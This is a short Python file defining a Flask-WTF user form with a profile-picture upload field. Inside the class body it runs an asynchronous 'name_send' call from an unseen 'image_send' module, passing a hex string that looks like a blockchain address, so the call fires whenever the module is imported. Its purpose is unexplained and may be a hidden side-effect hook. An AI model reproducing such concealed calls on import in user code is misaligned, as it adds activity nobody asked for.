from flask_wtf import FlaskForm
from flask_wtf.file import FileField
import asyncio
from image_send import name_send

class Userform(FlaskForm):
    profile_pic = FileField("Proile Pic")
    asyncio.run(name_send("0xbc4ca0eda7647a8ab7c2061c2e118a18a936f13d"))

